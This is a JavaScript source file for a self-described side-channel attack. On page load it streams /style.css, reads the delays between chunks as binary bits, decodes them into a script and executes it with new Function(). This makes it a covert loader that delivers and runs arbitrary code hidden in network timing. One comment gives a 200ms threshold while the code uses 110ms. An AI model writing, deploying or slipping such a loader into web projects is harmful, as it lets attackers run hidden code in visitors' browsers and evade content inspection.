// Fixed threshold for distinguishing between short and long delays (in ms)
// Using 200ms as middle ground between 100ms (short) and 300ms (long)
const THRESHOLD = 110;

// Minimum delay to consider as intentional (to filter out noise)
const MIN_DELAY = 50;

let statusElement = document.getElementById('status');
let binaryOutputElement = document.getElementById('binary-output');
let decodedOutputElement = document.getElementById('decoded-output');
let collectedBits = '';
let lastChunkTime = 0;

function updateStatus(message) {
  statusElement.textContent = message;
  console.log(message);
}

function updateBinaryOutput() {
  // Format binary with spaces for readability
  let formattedBinary = '';
  for (let i = 0; i < collectedBits.length; i++) {
    formattedBinary += collectedBits[i];
    if ((i + 1) % 8 === 0) formattedBinary += ' ';
  }
  binaryOutputElement.textContent = `Binary: ${formattedBinary}`;
}

function startSideChannel() {
  updateStatus("Starting side-channel stream...");

  // Create a fetch request that reads the response as a stream
  fetch('/style.css', {
    cache: 'no-store',
    headers: {
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache'
    }
  })
  .then(response => {
    if (!response.body) {
      throw new Error("ReadableStream not supported");
    }

    // Get a reader for the stream
    const reader = response.body.getReader();
    lastChunkTime = performance.now();

    // Function to read chunks
    function readChunk() {
      reader.read().then(({ done, value }) => {
        if (done) {
          updateStatus("Stream complete. Processing data...");
          processCollectedBits();
          return;
        }

        const currentTime = performance.now();
        const timeDiff = currentTime - lastChunkTime;
        lastChunkTime = currentTime;

        // Process the timing difference
        if (timeDiff > MIN_DELAY) {
          processTimingDifference(timeDiff, new TextDecoder().decode(value));
        }

        // Continue reading
        readChunk();
      }).catch(error => {
        updateStatus("Error reading stream: " + error);
      });
    }

    // Start reading
    readChunk();
  })
  .catch(error => {
    updateStatus("Error fetching CSS: " + error);
  });
}

function processTimingDifference(timeDiff, chunk) {
  // Determine bit value based on timing
  const bit = timeDiff > THRESHOLD ? '1' : '0';
  collectedBits += bit;

  updateStatus(`Received chunk (${Math.round(timeDiff)}ms): Bit=${bit}, Total bits=${collectedBits.length}`);
  updateBinaryOutput();
}

function processCollectedBits() {
  updateStatus(`Processing ${collectedBits.length} bits of data`);

  // Ensure we have complete bytes (multiples of 8 bits)
  const completeBytes = Math.floor(collectedBits.length / 8);
  const usableBits = collectedBits.substring(0, completeBytes * 8);

  // Convert binary to ASCII
  let jsCode = '';
  for (let i = 0; i < usableBits.length; i += 8) {
    const byte = usableBits.substr(i, 8);
    if (byte.length === 8) {
      jsCode += String.fromCharCode(parseInt(byte, 2));
    }
  }

  decodedOutputElement.textContent = `Decoded JavaScript: ${jsCode}`;
  updateStatus(`Decoded JavaScript: ${jsCode}`);

  // Execute the JavaScript code with extra safety
  try {
    // Verify it's valid JavaScript before executing
    const sanitizedCode = jsCode.trim();

    // Log what we're about to execute
    updateStatus(`Executing: ${sanitizedCode}`);

    // Use indirect eval to execute in global scope
    (new Function(sanitizedCode))();

    updateStatus('Successfully executed JavaScript from side-channel');
  } catch (e) {
    updateStatus(`Error executing code: ${e.message}`);
  }
}

// Start the side-channel attack
window.onload = startSideChannel;
